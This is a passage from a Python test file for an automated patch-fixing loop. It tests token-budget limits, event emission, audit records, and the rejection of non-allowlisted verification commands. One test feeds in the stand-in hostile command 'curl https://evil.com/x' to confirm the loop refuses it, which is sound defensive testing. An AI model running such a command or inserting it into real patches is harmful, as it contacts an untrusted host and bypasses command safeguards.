        # Pre-load the budget so the FIRST iteration exhausts it
        # tokens_used=0 on entry; after the prompt estimate it must exceed.
        # Use a token_budget of 1 — even a tiny prompt will exceed it.
        result = ft._react_iterate(
            {"id": "t-budget", "title": "x", "last_failure_reason": "boom"},
            {"suspect_files": ["tools/foo.py"]},
            {"files": [{"path": "tools/foo.py", "old_string": "a", "new_string": "b"}],
             "verification_command": "python -m pytest tests/"},
            wt, "autofix/x", "sig-abc",
            max_iterations=10,
            token_budget=1,
        )
        assert result["outcome"] == "budget_exhausted"
        assert result["iterations"] == 1  # bails before the verify run

    def test_iterate_terminates_on_unverified_verification_command(self, ft, monkeypatch, tmp_path):
        """A refined patch whose verification_command isn't allowlisted
        MUST be rejected — outcome=rejected_verification_command."""
        wt = tmp_path / "wt"
        wt.mkdir()
        (wt / "tools").mkdir()
        (wt / "tools" / "foo.py").write_text("a", encoding="utf-8")

        # First iteration: verify fails with non-matching fingerprint
        counter = {"n": 0}

        def varying_run(cmd, cwd, timeout=60):
            counter["n"] += 1
            return (1, f"E boom{counter['n']}\nFAILED t::test{counter['n']}\n")
        monkeypatch.setattr(ft, "_run", varying_run)

        # Refinement proposes an evil verification command
        monkeypatch.setattr(
            ft, "_react_refine_patch",
            lambda *a, **k: {
                "files": [{"path": "tools/foo.py",
                           "old_string": "a", "new_string": "b"}],
                "verification_command": "curl https://evil.com/x",
            },
        )

        result = ft._react_iterate(
            {"id": "t-evil", "title": "x", "last_failure_reason": "boom"},
            {"suspect_files": ["tools/foo.py"]},
            {"files": [{"path": "tools/foo.py", "old_string": "a", "new_string": "b"}],
             "verification_command": "python -m pytest tests/"},
            wt, "autofix/x", "sig-abc",
            max_iterations=5,
        )
        assert result["outcome"] == "rejected_verification_command"
        # Refinement proposed one bad command → loop halted on iter 2
        assert result["iterations"] == 2

    def test_iterate_emits_react_iteration_and_finished_events(self, ft, monkeypatch, tmp_path):
        """Each iteration MUST emit react_iteration, and the loop MUST
        emit a single terminal react_finished with the loop outcome."""
        # _emit_event is called as ``_emit_event(event_type, **kwargs)``,
        # so we capture both the positional event_type and the kwargs dict.
        captured = []
        monkeypatch.setattr(
            ft, "_emit_event",
            lambda event_type, **k: captured.append((event_type, k)),
        )

        wt = tmp_path / "wt"
        wt.mkdir()
        (wt / "tools").mkdir()
        (wt / "tools" / "foo.py").write_text("a", encoding="utf-8")

        monkeypatch.setattr(ft, "_run", lambda cmd, cwd, timeout=60: (0, "ok"))
        monkeypatch.setattr(ft, "_react_refine_patch", lambda *a, **k: None)

        ft._react_iterate(
            {"id": "t-evt", "title": "x", "last_failure_reason": "boom"},
            {"suspect_files": ["tools/foo.py"]},
            {"files": [{"path": "tools/foo.py", "old_string": "a", "new_string": "b"}],
             "verification_command": "python -m pytest tests/"},
            wt, "autofix/x", "sig-abc",
        )

        iteration_types = [et for (et, _k) in captured
                           if et == ft.EVENT_REACT_ITERATION]
        finished = [(et, k) for (et, k) in captured
                    if et == ft.EVENT_REACT_FINISHED]
        # One iteration event for the single round, one finished event.
        assert len(iteration_types) == 1
        assert len(finished) == 1
        # The finished event carries the terminal outcome
        _et, finished_kw = finished[0]
        assert finished_kw["outcome"] == "fixed"
        assert finished_kw["iterations"] == 1

    def test_apply_patch_in_worktree_passes_loop_outcome_into_audit(self, ft, monkeypatch, tmp_path):
        """The audit record MUST carry the loop's outcome and iteration
        count so the panel (arc-obs-03) can display them."""
        monkeypatch.setattr(ft, "AUDIT_DIR", tmp_path / "audit")
        monkeypatch.setattr(ft, "record_apply", lambda ts=None: None)
        monkeypatch.setattr(ft, "_create_autofix_worktree",
                            lambda tid, sig: (tmp_path / "wt", "autofix/x"))
        monkeypatch.setattr(ft, "_validate_verification_command", lambda c: (True, "ok"))
        monkeypatch.setattr(ft, "_validate_patch_files", lambda p, d: (True, "ok"))
        # Force the loop to bail with no_progress on iter 1
        monkeypatch.setattr(ft, "_run", lambda *a, **k: (1, "E boom\nFAILED t::x\n"))
        monkeypatch.setattr(ft, "_cleanup_autofix_worktree", lambda *a, **k: None)

        wt = tmp_path / "wt"
        wt.mkdir()
        (wt / "tools").mkdir()
        (wt / "tools" / "foo.py").write_text("a", encoding="utf-8")

        result = ft.apply_patch_in_worktree(
            {"id": "t-audit", "title": "t", "last_failure_reason": "boom"},
            {"suspect_files": ["tools/foo.py"], "confidence": 0.9,
             "recommendation": "patch"},
            {"files": [{"path": "tools/foo.py", "old_string": "a", "new_string": "b"}],
             "verification_command": "python -m pytest tests/"},
        )
        assert result["applied"] is False
        assert result["outcome"] == "react_no_progress"

        tmp_path / "audit" / "t-audit__sig-abc.json"
        # Find the audit file by glob (sig depends on _sig(reason))
        audits = list((tmp_path / "audit").glob("t-audit__*.json"))
        assert audits, "audit file should have been written"
        import json
        record = json.loads(audits[0].read_text(encoding="utf-8"))
        assert record["iterations"] == ft.REACT_NO_PROGRESS_WINDOW
        assert "react_history" in record
        assert "react_tokens_used" in record
        assert record["outcome"] == "react_no_progress"
